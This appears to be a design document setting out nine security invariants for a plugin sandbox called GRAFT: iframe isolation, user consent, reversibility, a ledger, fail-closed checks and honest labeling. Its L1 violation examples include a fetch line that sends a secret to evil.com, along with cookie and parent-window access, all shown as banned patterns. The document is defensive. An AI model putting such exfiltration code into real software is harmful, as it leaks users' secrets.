# Laws of Anatomy

These are the invariants that must never be violated. Any violation is a critical bug.

---

## L1. Sandbox Boundary

**Organs never access the network, storage, cookies, parent/top windows, or the DOM outside their iframe.**

### Rationale
The sandbox is the primary security boundary. Organs are untrusted code and must be completely isolated.

### Enforcement
- Static analysis (Stage 1) detects banned constructs
- CSP prevents network requests at runtime
- Behavioral run (Stage 3) catches obfuscated attempts

### Examples of Violations
```javascript
// ❌ Network access
fetch('https://evil.com/steal?data=' + secret);

// ❌ Storage access
localStorage.setItem('key', data);

// ❌ Cookie access
document.cookie;

// ❌ Parent window access
window.top.location;

// ❌ DOM outside iframe
window.parent.document.body;
```

---

## L2. Nerve API Exclusivity

**The Nerve API is the only channel between organs and the Creature. Extending it requires a spec change and a version bump.**

### Rationale
A single, versioned API ensures compatibility and enables testing.

### Enforcement
- Static analysis detects direct property access
- Manifest validation ensures permissions are declared
- Runtime drops messages not in the protocol

### Examples of Violations
```javascript
// ❌ Direct property access
window.creatureData;

// ❌ Custom message type
window.parent.postMessage({ type: 'custom' }, '*');

// ❌ Undocumented API
window.secretAPI.getData();
```

---

## L3. Explicit Consent

**No organ is installed without explicit user consent. The transplant button must be clicked by the user.**

### Rationale
User agency is fundamental. The user must approve every feature addition.

### Enforcement
- UI shows consent dialog after immune system passes
- Transplant only happens on button click
- Ledger records consent event

### Examples of Violations
```javascript
// ❌ Auto-install
if (immuneReport.pass) {
  install(organ);  // Missing consent!
}

// ❌ Implicit consent
if (userClickedAnywhere) {
  install(organ);  // Not the transplant button!
}
```

---

## L4. Reversibility

**Every transplant is reversible by amputation. Amputation must restore the Creature to its exact prior state.**

### Rationale
Users must be able to undo any change. This enables safe experimentation.

### Enforcement
- Snapshot taken before transplant
- Amputation restores snapshot
- Property H3 tests this invariant

### Examples of Violations
```javascript
// ❌ No snapshot
install(organ);  // No snapshot taken!

// ❌ Partial restore
function amputate(organId) {
  removeOrgan(organId);
  // Missing: restore layout, registry, state
}

// ❌ State not restored
removeOrgan(organId);
// User's other settings changed!
```

---

## L5. Ledger First

**Every state change writes a ledger entry before applying the change. The hash chain must remain verifiable.**

### Rationale
The ledger provides tamper-evident provenance. Writing before the change ensures atomicity.

### Enforcement
- Ledger write must succeed before state change
- Hash chain verified on demand
- Property H1 tests chain integrity

### Examples of Violations
```javascript
// ❌ Ledger after
install(organ);
ledger.append('TRANSPLANT_APPROVED', organ.id);  // Too late!

// ❌ No ledger
install(organ);  // No ledger entry!

// ❌ Hash chain broken
ledger.append('EVENT', data);
// Hash computed incorrectly!
```

---

## L6. Injected Time and Randomness

**Time and randomness are injected via `nerve.now()` and `nerve.random()`, never ambient `Date` or `Math.random` inside organ code.**

### Rationale
Determinism is essential for reproducible tests. Ambient time/randomness breaks this.

### Enforcement
- Static analysis detects `Date` and `Math.random` usage
- Behavioral run verifies determinism (U4)
- Test harness controls time and RNG

### Examples of Violations
```javascript
// ❌ Ambient time
const now = Date.now();

// ❌ Ambient randomness
const r = Math.random();

// ❌ New Date
const today = new Date();

// ✅ Injected time
const now = nerve.now();

// ✅ Injected randomness
const r = nerve.random();
```

---

## L7. Fail Closed

**The immune system fails closed. An error inside the immune system means rejection, not acceptance.**

### Rationale
When in doubt, reject. An error in verification should never allow unsafe code through.

### Enforcement
- All immune stages catch errors
- Any error results in rejection
- Error details logged, organ not installed

### Examples of Violations
```javascript
// ❌ Fail open
try {
  runStaticScan(organ);
} catch (error) {
  console.error(error);
  return { pass: true };  // Wrong!
}

// ✅ Fail closed
try {
  runStaticScan(organ);
} catch (error) {
  console.error(error);
  return { 
    pass: false, 
    reason: 'INTERNAL_ERROR',
    message: 'Static scan failed'
  };
}
```

---

## L8. Honest Language

**Never describe the system as guaranteeing safety. Use "reduces risk" language. The README THREAT_MODEL must list what GRAFT does not defend against.**

### Rationale
Overclaiming breeds complacency. Users must understand the limits.

### Enforcement
- README includes THREAT_MODEL section
- UI never claims "guaranteed safe"
- Documentation uses accurate language

### Examples of Violations
```markdown
<!-- ❌ Overclaiming -->
GRAFT guarantees that organs are safe.

<!-- ✅ Honest -->
GRAFT reduces risk through multi-stage verification.

<!-- ✅ Threat model -->
## THREAT_MODEL

GRAFT does not defend against:
- Browser zero-days
- Resource exhaustion beyond rate limits
- Malicious host-side code
```

---

## L9. Labeled Replay

**Demo or replay data is always labeled in the UI. Never present replayed Doctor output as live.**

### Rationale
Users must know when they're seeing recorded vs. live output. This prevents deception.

### Enforcement
- Replay mode shows "REPLAY" badge
- Doctor's Notes header indicates mode
- Footer shows disclosure

### Examples of Violations
```jsx
<!-- ❌ No label -->
<DoctorNotes events={replayEvents} />

<!-- ✅ Labeled -->
<DoctorNotes events={replayEvents} />
{isReplay && <Badge>REPLAY</Badge>}
```

---

## Enforcement Summary

| Law | Static Analysis | Runtime | Ledger | Property Test |
|-----|----------------|---------|--------|---------------|
| L1  | ✅ Stage 1      | ✅ CSP  | -      | -             |
| L2  | ✅ Stage 1      | ✅ Host | -      | ✅ U3         |
| L3  | -              | ✅ UI   | ✅     | -             |
| L4  | -              | ✅ Host | ✅     | ✅ H3         |
| L5  | -              | ✅ Host | ✅     | ✅ H1         |
| L6  | ✅ Stage 1      | ✅ Host | -      | ✅ U4         |
| L7  | -              | ✅ Host | -      | -             |
| L8  | -              | -       | -      | Manual        |
| L9  | -              | ✅ UI   | -      | Manual        |
